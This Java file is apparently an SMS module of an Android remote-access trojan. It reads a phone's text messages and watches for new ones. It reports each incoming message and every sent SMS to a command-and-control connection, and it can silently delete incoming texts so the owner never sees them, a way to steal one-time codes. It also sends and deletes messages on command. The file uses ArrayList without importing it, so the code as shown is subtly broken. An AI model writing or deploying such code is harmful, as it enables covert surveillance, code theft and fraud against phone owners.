package com.tarjon.admin.utils;

import android.Manifest;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import android.provider.Telephony;
import android.util.Log;

import androidx.core.app.ActivityCompat;

import com.tarjon.admin.network.C2Connection;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * Manages SMS-related functionality
 * Handles SMS reading, sending, and monitoring
 */
public class SmsManager {
    private static final String TAG = "SmsManager";
    
    private final Context context;
    private final C2Connection c2Connection;
    private final ExecutorService executor;
    
    // SMS content observer
    private SmsContentObserver smsObserver;
    private boolean isMonitoring = false;
    
    // SMS interception
    private boolean interceptSms = false;
    
    public SmsManager(Context context, C2Connection c2Connection) {
        this.context = context;
        this.c2Connection = c2Connection;
        this.executor = Executors.newSingleThreadExecutor();
    }
    
    /**
     * Get SMS messages from the device
     * @param type Type of SMS messages (inbox, sent, draft)
     * @param limit Maximum number of messages to retrieve
     * @param callback Callback to receive messages
     */
    public void getSmsMessages(String type, int limit, SmsCallback callback) {
        // Check for permissions
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) != 
                PackageManager.PERMISSION_GRANTED) {
            if (callback != null) {
                callback.onError("SMS read permission not granted");
            }
            return;
        }
        
        executor.execute(() -> {
            try {
                ContentResolver contentResolver = context.getContentResolver();
                
                // Determine URI based on SMS type
                Uri uri;
                switch (type.toLowerCase()) {
                    case "inbox":
                        uri = Telephony.Sms.Inbox.CONTENT_URI;
                        break;
                    case "sent":
                        uri = Telephony.Sms.Sent.CONTENT_URI;
                        break;
                    case "draft":
                        uri = Telephony.Sms.Draft.CONTENT_URI;
                        break;
                    case "all":
                    default:
                        uri = Telephony.Sms.CONTENT_URI;
                        break;
                }
                
                // Columns to retrieve
                String[] projection = new String[] {
                        Telephony.Sms._ID,
                        Telephony.Sms.ADDRESS,
                        Telephony.Sms.BODY,
                        Telephony.Sms.DATE,
                        Telephony.Sms.DATE_SENT,
                        Telephony.Sms.READ,
                        Telephony.Sms.TYPE,
                        Telephony.Sms.STATUS,
                        Telephony.Sms.THREAD_ID
                };
                
                // Sort by date descending (newest first)
                String sortOrder = Telephony.Sms.DATE + " DESC";
                
                // Add limit if provided
                if (limit > 0) {
                    sortOrder += " LIMIT " + limit;
                }
                
                Cursor cursor = contentResolver.query(
                        uri, 
                        projection, 
                        null, 
                        null, 
                        sortOrder);
                
                JSONArray messages = new JSONArray();
                
                if (cursor != null && cursor.moveToFirst()) {
                    do {
                        JSONObject message = new JSONObject();
                        
                        // Get SMS details
                        String id = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms._ID));
                        String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                        String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                        long date = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
                        long dateSent = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE_SENT));
                        int read = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.READ));
                        int messageType = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE));
                        int status = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.STATUS));
                        String threadId = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.THREAD_ID));
                        
                        // Add to JSON object
                        message.put("id", id);
                        message.put("address", address);
                        message.put("body", body);
                        message.put("date", date);
                        message.put("dateSent", dateSent);
                        message.put("read", read == 1);
                        message.put("type", messageType);
                        message.put("status", status);
                        message.put("threadId", threadId);
                        
                        // Add message type as string
                        switch (messageType) {
                            case Telephony.Sms.MESSAGE_TYPE_INBOX:
                                message.put("typeStr", "inbox");
                                break;
                            case Telephony.Sms.MESSAGE_TYPE_SENT:
                                message.put("typeStr", "sent");
                                break;
                            case Telephony.Sms.MESSAGE_TYPE_DRAFT:
                                message.put("typeStr", "draft");
                                break;
                            case Telephony.Sms.MESSAGE_TYPE_OUTBOX:
                                message.put("typeStr", "outbox");
                                break;
                            case Telephony.Sms.MESSAGE_TYPE_FAILED:
                                message.put("typeStr", "failed");
                                break;
                            case Telephony.Sms.MESSAGE_TYPE_QUEUED:
                                message.put("typeStr", "queued");
                                break;
                            default:
                                message.put("typeStr", "unknown");
                                break;
                        }
                        
                        // Add formatted date
                        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);
                        message.put("dateStr", sdf.format(new Date(date)));
                        
                        // Add to messages array
                        messages.put(message);
                        
                    } while (cursor.moveToNext());
                    
                    cursor.close();
                }
                
                // Create result object
                JSONObject result = new JSONObject();
                result.put("type", type);
                result.put("messages", messages);
                result.put("count", messages.length());
                
                // Send to callback
                if (callback != null) {
                    callback.onSmsLoaded(result.toString());
                }
                
            } catch (Exception e) {
                Log.e(TAG, "Error retrieving SMS messages: " + e.getMessage());
                if (callback != null) {
                    callback.onError("Error retrieving SMS messages: " + e.getMessage());
                }
            }
        });
    }
    
    /**
     * Send an SMS message
     * @param phoneNumber Recipient phone number
     * @param message Message body
     * @param callback Callback for result
     */
    public void sendSms(String phoneNumber, String message, SmsSendCallback callback) {
        // Check for permissions
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.SEND_SMS) != 
                PackageManager.PERMISSION_GRANTED) {
            if (callback != null) {
                callback.onError("SMS send permission not granted");
            }
            return;
        }
        
        executor.execute(() -> {
            try {
                android.telephony.SmsManager smsManager = android.telephony.SmsManager.getDefault();
                
                // Split message if it's too long
                if (message.length() > 160) {
                    ArrayList<String> parts = smsManager.divideMessage(message);
                    smsManager.sendMultipartTextMessage(phoneNumber, null, parts, null, null);
                } else {
                    smsManager.sendTextMessage(phoneNumber, null, message, null, null);
                }
                
                // Log the sent message
                try {
                    JSONObject messageData = new JSONObject();
                    messageData.put("address", phoneNumber);
                    messageData.put("body", message);
                    messageData.put("date", System.currentTimeMillis());
                    
                    c2Connection.sendCommandResult("sms_sent", 
                            "SMS sent to " + phoneNumber, 
                            messageData.toString());
                } catch (JSONException e) {
                    Log.e(TAG, "Error creating JSON for SMS: " + e.getMessage());
                }
                
                if (callback != null) {
                    callback.onSuccess();
                }
                
            } catch (Exception e) {
                Log.e(TAG, "Error sending SMS: " + e.getMessage());
                if (callback != null) {
                    callback.onError("Error sending SMS: " + e.getMessage());
                }
            }
        });
    }
    
    /**
     * Start monitoring for new SMS messages
     */
    public void startMonitoring() {
        if (isMonitoring) {
            return;
        }
        
        // Check for permissions
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) != 
                PackageManager.PERMISSION_GRANTED) {
            return;
        }
        
        if (smsObserver == null) {
            smsObserver = new SmsContentObserver(new Handler(Looper.getMainLooper()));
        }
        
        try {
            context.getContentResolver().registerContentObserver(
                    Telephony.Sms.CONTENT_URI, 
                    true, 
                    smsObserver);
            
            isMonitoring = true;
            
            c2Connection.sendCommandResult("sms_monitoring", 
                    "SMS monitoring started");
            
        } catch (Exception e) {
            Log.e(TAG, "Error starting SMS monitoring: " + e.getMessage());
            c2Connection.sendCommandResult("sms_monitoring", 
                    "Error starting SMS monitoring: " + e.getMessage());
        }
    }
    
    /**
     * Stop monitoring for SMS messages
     */
    public void stopMonitoring() {
        if (!isMonitoring || smsObserver == null) {
            return;
        }
        
        try {
            context.getContentResolver().unregisterContentObserver(smsObserver);
            isMonitoring = false;
            
            c2Connection.sendCommandResult("sms_monitoring", 
                    "SMS monitoring stopped");
            
        } catch (Exception e) {
            Log.e(TAG, "Error stopping SMS monitoring: " + e.getMessage());
            c2Connection.sendCommandResult("sms_monitoring", 
                    "Error stopping SMS monitoring: " + e.getMessage());
        }
    }
    
    /**
     * Set SMS interception
     * @param intercept Whether to intercept incoming SMS
     */
    public void setInterceptSms(boolean intercept) {
        this.interceptSms = intercept;
    }
    
    /**
     * Process an incoming SMS
     * @param address Sender phone number
     * @param body Message body
     * @return true if SMS was intercepted
     */
    public boolean processIncomingSms(String address, String body) {
        // Log the incoming SMS
        try {
            JSONObject messageData = new JSONObject();
            messageData.put("address", address);
            messageData.put("body", body);
            messageData.put("date", System.currentTimeMillis());
            messageData.put("intercepted", interceptSms);
            
            c2Connection.sendCommandResult("sms_received", 
                    "SMS from " + address, 
                    messageData.toString());
        } catch (JSONException e) {
            Log.e(TAG, "Error creating JSON for incoming SMS: " + e.getMessage());
        }
        
        // Return interception status
        return interceptSms;
    }
    
    /**
     * Delete an SMS message
     * @param messageId ID of the message to delete
     * @return true if deletion was successful
     */
    public boolean deleteSms(String messageId) {
        // Check for permissions
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.WRITE_SMS) != 
                PackageManager.PERMISSION_GRANTED) {
            return false;
        }
        
        try {
            Uri uri = Uri.parse("content://sms/" + messageId);
            int deleted = context.getContentResolver().delete(uri, null, null);
            return deleted > 0;
        } catch (Exception e) {
            Log.e(TAG, "Error deleting SMS: " + e.getMessage());
            return false;
        }
    }
    
    /**
     * Delete all SMS messages from a specific phone number
     * @param phoneNumber Phone number to delete messages from
     * @return Number of messages deleted
     */
    public int deleteSmsByAddress(String phoneNumber) {
        // Check for permissions
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.WRITE_SMS) != 
                PackageManager.PERMISSION_GRANTED) {
            return 0;
        }
        
        try {
            return context.getContentResolver().delete(
                    Telephony.Sms.CONTENT_URI,
                    Telephony.Sms.ADDRESS + " = ?",
                    new String[] { phoneNumber });
        } catch (Exception e) {
            Log.e(TAG, "Error deleting SMS by address: " + e.getMessage());
            return 0;
        }
    }
    
    /**
     * Mark an SMS message as read
     * @param messageId ID of the message to mark
     * @return true if operation was successful
     */
    public boolean markSmsAsRead(String messageId) {
        // Check for permissions
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.WRITE_SMS) != 
                PackageManager.PERMISSION_GRANTED) {
            return false;
        }
        
        try {
            ContentValues values = new ContentValues();
            values.put(Telephony.Sms.READ, 1);
            
            Uri uri = Uri.parse("content://sms/" + messageId);
            int updated = context.getContentResolver().update(uri, values, null, null);
            return updated > 0;
        } catch (Exception e) {
            Log.e(TAG, "Error marking SMS as read: " + e.getMessage());
            return false;
        }
    }
    
    /**
     * Content observer for SMS database changes
     */
    private class SmsContentObserver extends ContentObserver {
        private static final String TAG = "SmsObserver";
        private long lastId = -1;
        
        public SmsContentObserver(Handler handler) {
            super(handler);
        }
        
        @Override
        public void onChange(boolean selfChange) {
            super.onChange(selfChange);
            
            // Check for permissions
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) != 
                    PackageManager.PERMISSION_GRANTED) {
                return;
            }
            
            executor.execute(() -> {
                try {
                    // Query the latest SMS
                    ContentResolver contentResolver = context.getContentResolver();
                    
                    // Columns to retrieve
                    String[] projection = new String[] {
                            Telephony.Sms._ID,
                            Telephony.Sms.ADDRESS,
                            Telephony.Sms.BODY,
                            Telephony.Sms.DATE,
                            Telephony.Sms.TYPE
                    };
                    
                    // Sort by date descending (newest first)
                    String sortOrder = Telephony.Sms.DATE + " DESC LIMIT 1";
                    
                    Cursor cursor = contentResolver.query(
                            Telephony.Sms.CONTENT_URI, 
                            projection, 
                            null, 
                            null, 
                            sortOrder);
                    
                    if (cursor != null && cursor.moveToFirst()) {
                        // Get SMS details
                        long id = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms._ID));
                        String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                        String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                        long date = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
                        int type = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE));
                        
                        cursor.close();
                        
                        // Only process if this is a new message (avoid duplicate notifications)
                        if (id != lastId) {
                            lastId = id;
                            
                            // Only process incoming messages
                            if (type == Telephony.Sms.MESSAGE_TYPE_INBOX) {
                                // Check if we should intercept this SMS
                                if (interceptSms) {
                                    // Delete the message
                                    Uri uri = Uri.parse("content://sms/" + id);
                                    contentResolver.delete(uri, null, null);
                                }
                                
                                // Notify about the new message
                                processIncomingSms(address, body);
                            }
                        }
                    }
                    
                } catch (Exception e) {
                    Log.e(TAG, "Error in SMS observer: " + e.getMessage());
                }
            });
        }
    }
    
    /**
     * Clean up resources
     */
    public void release() {
        stopMonitoring();
        
        if (executor != null && !executor.isShutdown()) {
            executor.shutdownNow();
        }
    }
    
    /**
     * Interface for SMS callbacks
     */
    public interface SmsCallback {
        void onSmsLoaded(String smsJson);
        void onError(String error);
    }
    
    /**
     * Interface for SMS send callbacks
     */
    public interface SmsSendCallback {
        void onSuccess();
        void onError(String error);
    }
}